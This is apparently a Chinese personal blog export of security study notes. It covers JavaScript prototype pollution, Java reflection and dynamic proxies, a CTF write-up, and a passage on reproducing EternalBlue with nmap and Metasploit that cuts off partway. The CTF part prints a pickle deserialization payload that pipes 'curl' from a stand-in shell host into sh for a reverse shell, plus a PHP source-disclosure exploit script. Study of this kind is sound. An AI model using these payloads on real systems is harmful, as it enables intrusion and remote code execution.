class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br><span class="line">foo.<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure><p>这里就是在Foo类用了prototype后，那么接下来实例化Foo类的对象，将会有Foo类里面的属性和方法。</p><p>再给一个代码来进行理解上面写的解释</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">last_name</span> = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure><p>就是使用<code>Son.prototype = new Father()</code>后，这里使用了prototype，进行了实例化对象，那么接下来Son类实例化的对象都能拥有Father()类里边的属性和方法</p><p>上面可能就是看p牛文章时会疑惑的点</p><p><img src="../images/image-20230316195653525.png" alt="image-20230316195653525"></p><p>这是p牛总结的</p><p>p牛写的代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的作用是将两个对象（<code>target</code> 和 <code>source</code>）进行合并，返回合并后的 <code>target</code> 对象。具体来说，它会将 <code>source</code> 对象中的属性递归地合并到 <code>target</code> 对象中，如果某个属性在 <code>source</code> 对象中存在但在 <code>target</code> 对象中不存在，则直接将该属性赋值给 <code>target</code> 对象。</p><p>这个函数通过使用 <code>for...in</code> 循环遍历 <code>source</code> 对象中的每一个属性，然后使用 <code>if</code> 语句判断该属性是否同时存在于 <code>source</code> 和 <code>target</code> 对象中。如果是，则递归调用 <code>merge</code> 函数，将 <code>source</code> 对象中对应的属性合并到 <code>target</code> 对象中对应的属性上；如果不是，则直接将该属性赋值给 <code>target</code> 对象。</p><p><strong>这是对上面的代码的解释</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> nodejs-污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java动态代理</title>
      <link href="/posts/bcee6ab6.html"/>
      <url>/posts/bcee6ab6.html</url>
      
        <content type="html"><![CDATA[<p>这个和反射不同的地方在于，这个东西有接口</p><p>这里话进行学习的话得需要四个java代码</p><p><img src="../images/image-20230315183517863.png" alt="image-20230315183517863"></p><p>一个接口和其他三个class</p><p> 这里的IUser是一个接口</p><p><img src="../images/image-20230315190938799.png" alt="image-20230315190938799"></p><p>UserImpl是一个继承于IUser接口,里面重写了IUser接口里的show()方法</p><p><img src="../images/image-20230315190955845.png" alt="image-20230315190955845"></p><p>UserProxy也是一个继承IUser接口，里面也是重写了show方法</p><p><img src="../images/image-20230315191007234.png" alt="image-20230315191007234"></p><p>ProxyTest是个产生代理对象的类</p><p><img src="../images/image-20230315191016626.png" alt="image-20230315191016626"></p><p><strong>在这个产生代理对象的类里边进行操作</strong></p><p><img src="../images/image-20230315190818909.png" alt="image-20230315190818909"></p><p>这里因为UserImpl类是继承了IUser接口，所以这里的类型得定义为IUser.</p><p>然后这里就会调用UserImpl类里边的show方法</p><p><img src="../images/image-20230315191145326.png" alt="image-20230315191145326"></p><p>接下来使用另一个类</p><p><img src="../images/image-20230315191304912.png" alt="image-20230315191304912"></p><p><img src="../images/image-20230315191339554.png" alt="image-20230315191339554"></p><p>这里是会输出两个展示，因为UserProxy里面有一个有参构造函数，传的值是别人传入的对象，因为这里传入的对象是UserImpl的，所以在UserProxy调用show方法时，就会调用到UserImpl类里边的show方法</p><p><strong>以上展示的就是静态代理了</strong></p><p><strong>动态代理</strong></p><p>这里出现的动态代理就是因为静态代理有缺点，因为如果接口里面有很多函数的话，日志(UserImpl)里面也要重写很多函数的方法，代理类(UserProxy)里边也要重写很多类的方法。就会比较繁琐</p><p>这里要实现动态代理的话，就是得想要这个方法</p><p><img src="../images/image-20230315193449922.png" alt="image-20230315193449922"></p><p><img src="../images/image-20230315193502567.png" alt="image-20230315193502567"></p><p>这个方法限定了三个参数，前两个都是写死的，只要是最后一个，这个是关键(就是把想要做的东西传进去)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Proxy.newProxyInstance(user.getClass().getClassLoader(), user.getClass().getInterfaces(),xxx);</span><br></pre></td></tr></table></figure><p>这个xxx就是我们要做的事情</p><p>所以我们得先新建一个类</p><p><img src="../images/image-20230315204047548.png" alt="image-20230315204047548"></p><p><img src="../images/image-20230315204109374.png" alt="image-20230315204109374"></p><p>然后对这个invoke进行重写</p><p><img src="../images/image-20230315204538812.png" alt="image-20230315204538812"></p><p>这里和前面的那个代理类差不多，但是这里用的InvocationHandler这个类，</p><p>这个invoke函数，只要我们能传进来东西，他就会知道我们调用的是哪个方法，这是这个函数的性质</p><p>我们就到代理测试类那边进行调试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserinvocationHandler</span>(user);</span><br><span class="line">        <span class="type">IUser</span> <span class="variable">user1</span> <span class="operator">=</span> (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(), user.getClass().getInterfaces(),invocationHandler);</span><br></pre></td></tr></table></figure><p>我们就是利用这个invocationHandler这个类来进行动态代理，所以在new一个对象的时候，我们就用它。</p><p>然后再把实例化后的对象放进下面的Proxy.newProxyInstance里；</p><p><img src="../images/image-20230315205413275.png" alt="image-20230315205413275"></p><p>然后就可以直接调用这个方法了</p><p><img src="../images/image-20230315205707219.png" alt="image-20230315205707219"></p><p>在这个类里边新加这个方法的话，就可以直接调用了了，就不用再去代理类里边重写函数的方法了，这样的话就大大减少了代码量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">IUser</span> <span class="variable">user1</span> <span class="operator">=</span> (IUser) Proxy.newProxyInstance(iUser.getClass().getClassLoader(), iUser.getClass().getInterfaces(),invocationHandler);</span><br></pre></td></tr></table></figure><p>这里的代码也可以写成这样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">IUser</span> <span class="variable">user1</span> <span class="operator">=</span> (IUser) Proxy.newProxyInstance(iUser.getClass().getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;IUser.class&#125;,invocationHandler);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230315210106913.png" alt="image-20230315210106913"></p><p>跟这个有关</p>]]></content>
      
      
      
        <tags>
            
            <tag> java 动态代理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反射</title>
      <link href="/posts/e29c8e30.html"/>
      <url>/posts/e29c8e30.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV16h411z7o9?p=2&amp;vd_source=bacfffe46b930fda5761b63367eb298c">这里话是看这篇文章来进行学习的</a></p><p><img src="../images/image-20230314221340100.png" alt="image-20230314221340100"></p><p>上面的就是java反射的作用</p><p>这里的我们在本地自己写一个类来进行测试</p><p><strong>Person.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//构造函数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name,<span class="type">int</span> age)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//对Serializable这个接口里的toString函数进行重写</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;,age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//重新对readObject函数进行重写，然后在里面加一条命令执行的语句，这样的话就会在反序列化的时候就会执行，这样的话就会造成安全问题</span></span><br><span class="line">        ois.defaultReadObject();;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>); <span class="comment">//Runtime.getRuntime().exec 用于调用外部可执行程序或系统命令</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在定义一个reflect类来测试，就是在这个reflect类里边进行反射调试</p><p><img src="../images/image-20230314222547749.png" alt="image-20230314222547749"></p><p>在这个类里边，getClass()是得到person对象的Class</p><p>反射的实质就是操控Class</p><p><img src="../images/image-20230314223516379.png" alt="image-20230314223516379"></p><p><strong>这里从class里面实例化对象，方便含有无参和有参的方法</strong></p><p>里面的直接使用<code>c.newInstance();</code>是调用Person类里边的无参构造函数</p><p>使用下面这个代码的话是调用Person类里边的有参构造方法，在<code>c.getConstructor(String.class,int.class);</code>里边的参数，是根据Person类里边设置好的参数来进行填写，因为Person类里边的构造函数是(string,int),</p><p>所以这里就这样填<code>c.getConstructor(String.class,int.class);</code></p><p>最后直接在<code>Person person1 =(Person) constructor.newInstance(&quot;tom&quot;,12);</code>里边输入值，然后使用S.o.p输出就行了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line"><span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span>(Person) constructor.newInstance(<span class="string">&quot;tom&quot;</span>,<span class="number">12</span>);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230314224245408.png" alt="image-20230314224245408"></p><p><strong>获取类里面属性</strong></p><p><img src="../images/image-20230315165736464.png" alt="image-20230315165736464"></p><p>person类里边只有两个属性，一个公开的name,和一个私有的age</p><p><img src="../images/image-20230315165828360.png" alt="image-20230315165828360"></p><p><img src="../images/image-20230315170002571.png" alt="image-20230315170002571"></p><p>getField()方法就是获取属性的方法，属于Field这个类，但是getField()方法只能获取公开属性的方法，<strong>私有属性的使用另一个方法</strong>，下面会继续讲</p><p>这里代码的意思是，先获取person类里边的属性用数组装起来，然后用for循环进行输出</p><p><img src="../images/image-20230315170301659.png" alt="image-20230315170301659"></p><p><img src="../images/image-20230315170308038.png" alt="image-20230315170308038"></p><p>getDeclaredFields();方法就是可以访问私有和公有属性的，其他函数种只要含有Declared的,都是可以访问私有的</p><p>可以获取类里边的属性了，那么我们就可以尝试修改一下这些属性的值了</p><p><img src="../images/image-20230315170925185.png" alt="image-20230315170925185"></p><p><img src="../images/image-20230315170937920.png" alt="image-20230315170937920"></p><p>这就是修改前后的样子</p><p>代码是先获取到person类里边的属性，并确定要修改哪一个属性，这里写的是getField()，没有在末尾加上s，那么没加s的就是可以进行传参来确定要修改的值的，这里传的参数是name，那么我们就可以进行name属性值的修改，然后使用set()方法来确定修改谁的，修改成啥内容，这里添加的对象必须是实例化后的对像，所以是person1</p><p><img src="../images/image-20230315171418567.png" alt="image-20230315171418567"></p><p><strong>上面的代码是修改不了私有属性的</strong></p><p><img src="../images/image-20230315171806679.png" alt="image-20230315171806679"></p><p><img src="../images/image-20230315171818318.png" alt="image-20230315171818318"></p><p>成功进行修改，这里修改的关键就是这两行代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>其他代码的解释和上面说的一样</p><p><strong>接下来是调用类里边的方法</strong></p><p><img src="../images/image-20230315173404879.png" alt="image-20230315173404879"></p><p><img src="../images/image-20230315173513046.png" alt="image-20230315173513046"></p><p>还是和上面那个获取属性的方法一样，使用末尾加s的函数，利用数组来存贮，然后使用for循环输出</p><p>他这里获取的方法有person里边的，还有Object对象的，因为所有的类都继承于他，他是个底层类</p><p><strong>接下来我们换一种写法，不使用数组的写法</strong></p><p><img src="../images/image-20230315174050014.png" alt=""></p><p><img src="../images/image-20230315174116598.png" alt="image-20230315174116598"></p><p><img src="../images/image-20230315174128040.png" alt="image-20230315174128040"></p><p>就是这两个简单的代码，然后就可以访问person类里边的函数方法了，这里的getMethod()方法和那个getConstructor()方法类似，都是必须得告诉一下我们使用的是啥类型的参数。这里的invoke()方法在这里就是触发的意思，就是触发person里边的action方法，这里传的参数和上面的set()是一个意思，就是第一位得传实例化的对象，然后第二位传参数(可以在输出函数名的时候进行查看，idea会告诉你该传什么参数)</p><p><strong>接下来就是调用私有方法</strong></p><p><img src="../images/image-20230315175014198.png" alt="image-20230315175014198"></p><p>这里话是把getMethod换成了getDeclaredMethod，然后加一个可以进行修改的权限，method.setAccessible(true);</p><p><strong>reflect.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.ws.api.model.MEP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reflect</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> person.getClass();</span><br><span class="line">        <span class="comment">//从class里面实例化对象</span></span><br><span class="line">        c.newInstance();   <span class="comment">//这个是只能调用person类里边的无参构造函数</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span>(Person) constructor.newInstance(<span class="string">&quot;tom&quot;</span>,<span class="number">12</span>);</span><br><span class="line">        System.out.println(person1);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        //获取类里边的属性</span></span><br><span class="line"><span class="comment">//        Field[] fields = c.getDeclaredFields();</span></span><br><span class="line"><span class="comment">//        for (Field f:fields)</span></span><br><span class="line"><span class="comment">//         System.out.println(f);</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(person1,<span class="number">100</span>);</span><br><span class="line">        System.out.println(person1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用类里边的方法</span></span><br><span class="line"><span class="comment">//        Method[] method = c.getMethods();</span></span><br><span class="line"><span class="comment">//        for (Method m:method)</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(m);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//          Method method = c.getMethod(&quot;action&quot;, String.class);</span></span><br><span class="line"><span class="comment">//          method.invoke(person1,&quot;test&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;action&quot;</span>, String.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        method.invoke(person1,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上就是全部java反射的学习过程了</p>]]></content>
      
      
      
        <tags>
            
            <tag> java 反射 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCTF-web</title>
      <link href="/posts/4faf042b.html"/>
      <url>/posts/4faf042b.html</url>
      
        <content type="html"><![CDATA[<h2 id="考察的是python反序列化加session伪造"><a href="#考察的是python反序列化加session伪造" class="headerlink" title="考察的是python反序列化加session伪造"></a>考察的是python反序列化加session伪造</h2><p><img src="../images/image-20230312161118245.png" alt="image-20230312161118245"></p><p>题目给的提示是查看cookie</p><p>这道题用到的工具  <a href="https://github.com/Paradoxis/Flask-Unsign">flask-unsign</a></p><p>这道题的话是禁用了R指令   所以的话我们就不能使用<code>__reduce__</code>了，那么我们就得想其他的办法例如b,c指令集等等</p><p>这里的话可以参考这篇文章  <a href="https://zhuanlan.zhihu.com/p/89132768">python 反序列化</a></p><p>这里是先随便注册一下，然后拿到cookie</p><p><img src="../images/image-20230314211006068.png" alt="image-20230314211006068"></p><p>注册后去查看cookie</p><p>然后利用工具对cookie进行解码(flask)</p><p><img src="../images/image-20230314211102653.png" alt="image-20230314211102653"></p><p>解码后在拿userinfo里的东西拿去解码</p><p><img src="../images/image-20230314211249493.png" alt="image-20230314211249493"></p><p>解码后得到这两个关键信息，然后去上面给的文章里的payload进行修改</p><p><img src="../images/image-20230314211345239.png" alt="image-20230314211345239"></p><p><img src="../images/image-20230314211411148.png" alt="image-20230314211411148"></p><p>就是修改这两个地方</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;\x80\x03cuserinfo\nUser\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVcurl https://your-shell.com/ip:port |sh\nb.&#x27;</span></span><br></pre></td></tr></table></figure><p>然后对这个进行base64进行加密，并把加密后的结果替换掉userinfo里的东西，然后利用工具进行加密(这里的密钥是  CCTF)</p><p>然后去替换掉cookie，然后刷新访问个人信息，就能反弹shell到自己的服务器上了，记得要先进行监听</p><p>这里生成所有四位大写字母组成的字符串代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># 大写字母列表</span></span><br><span class="line">uppercase_letters = <span class="built_in">list</span>(string.ascii_uppercase)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成所有四位大写字母组成的字符串</span></span><br><span class="line">all_combinations = itertools.product(uppercase_letters, repeat=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印所有生成的字符串</span></span><br><span class="line"><span class="keyword">for</span> combination <span class="keyword">in</span> all_combinations:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(combination))</span><br></pre></td></tr></table></figure><h2 id="这道题是考察源码泄露"><a href="#这道题是考察源码泄露" class="headerlink" title="这道题是考察源码泄露"></a>这道题是考察源码泄露</h2><p>就是考察的这篇文章给出的漏洞  <a href="https://cn-sec.com/archives/1530845.html">PHP &lt;= 7.4.21远程源码泄露漏洞</a></p><p><strong>脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;219.219.61.234:49155&quot;</span></span><br><span class="line">path = <span class="string">&quot;/&quot;</span></span><br><span class="line"><span class="keyword">if</span> path == <span class="string">&quot;&quot;</span>:</span><br><span class="line">    path = <span class="string">&quot;/&quot;</span></span><br><span class="line">payload = <span class="string">f&quot;GET <span class="subst">&#123;path&#125;</span> HTTP/1.1\nHost: <span class="subst">&#123;host&#125;</span>\n\nGET /xxx.ccc HTTP/1.1\n\n&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    ip, port = host.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    ip = host</span><br><span class="line">    port = <span class="number">80</span></span><br><span class="line">s1 = socket.socket()</span><br><span class="line">s1.connect((ip, <span class="built_in">int</span>(port)))</span><br><span class="line">s1.send(payload.encode())</span><br><span class="line">text = s1.recv(<span class="number">4096</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(text)</span><br></pre></td></tr></table></figure><p>这里我是拿去kali跑的，因为pycharm跑不出来结果</p>]]></content>
      
      
      
        <tags>
            
            <tag> cumt-ctf-web final CCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透入门1</title>
      <link href="/posts/67769678.html"/>
      <url>/posts/67769678.html</url>
      
        <content type="html"><![CDATA[<p>渗透的第一步肯定是要进行信息收集了</p><p>那么我这这里就不多写了，这篇文章写的很全了  <a href="https://blog.csdn.net/MachineGunJoe/article/details/118769170">文章</a></p><p>这里补充一下c段的意思   <a href="https://www.cnblogs.com/renhaoblog/p/13026361.html">文章</a></p><p>这里利用<code>Metasploit framework</code>来进行永恒之蓝的复现，来实现一下对这个渗透工具的认识</p><h2 id="永恒之蓝复现"><a href="#永恒之蓝复现" class="headerlink" title="永恒之蓝复现"></a>永恒之蓝复现</h2><p>实验环境</p><p>攻击机 kali linux ,ip:172.22.81.160 </p><p>靶机 ：windows7  ip: 192.168.59.129</p><p><img src="../images/image-20230309210251701.png" alt="image-20230309210251701"></p><p>这里下的是win7的企业版</p><p><strong>1.这里首先第一步是得进行信息收集</strong></p><p>先扫一下端口</p><p>在kaili上使用nmap探测win7的端口信息：<strong>nmap 192.168.59.129 </strong>，可以看到该机器已开启445端口，当然也可以查看该445端口的banner信息，命令 <strong>nmap -sV -p445 192.168.59.129</strong></p><p><img src="../images/image-20230309212745990.png" alt="image-20230309212745990"></p><p>这里开启的445端口就是这个漏洞出现的关键了。</p><p>这里的nmap中 sV的意思</p><p><img src="../images/image-20230309212636248.png" alt="image-20230309212636248"></p><p>也就是  —&gt;  探测开放端口以确定服务/版本信息</p><p>想要查看其他的命令的话可以nmap -h</p><p><img src="../images/image-20230309213931076.png" alt="image-20230309213931076"></p><p>主机名和windows版本都能成功看到了</p><p><strong>2.使用kali自带的metasploit(msf)</strong></p><p>如果是初次使用，先输入<strong>msfconsole</strong>进入msf，然后键入<strong>search ms17_010</strong>，查询对应的模块</p><p><strong>第一步</strong></p><p><img src="../images/image-20230309214251838.png" alt="image-20230309214251838"></p><p><strong>第二步</strong></p><p><img src="../images/image-20230309214321075.png" alt="image-20230309214321075"></p><p>这里的话永恒之蓝漏洞就是ms17_010,所以我们search他，然后出来的命令有<code>exploit</code>和<code>auxiliary</code></p><p>exp的话是进行漏洞利用的</p><p>aux是是进行判断漏洞是否存在的(就是个辅助工具)</p><p><strong>3.探测是否存在永恒之蓝漏洞</strong></p><p>可以先探测一下该系统是否存在永恒之蓝漏洞，当然也可以批量扫描C段，上面有五个模块可以选择，扫描的话使用 auxiliary/scanner/smb/smb_ms17_010，因为里面包含了scanner，键入命令 <strong>use auxiliary/scanner/smb/smb_ms17_010</strong></p><p>查询该模块需要的参数，命令 <strong>show options</strong>，可以看到主要的参数是攻击的主机RHOSTS，设置参数：<strong>set rhosts 192.168.59.129</strong>【不分大小写】，再键入<strong>show options</strong> 即可查看是否成功赋值上，如果写错了可以选择unset rhosts来取消重新选择</p><p><img src="../images/image-20230309215018768.png" alt="image-20230309215018768"></p><p>这里的话是required上写的yes是必须的得添加的值</p><p>threds是线程的意思</p><p><strong>4.使用 run 或者 exploit 命令即可成功查询，可以看到，Host is likely VULNERABLE to MS17-010!【主机可能容易受到MS17-010的攻击!】，证明可能存在永恒之蓝漏洞，下面开始利用</strong></p><p><img 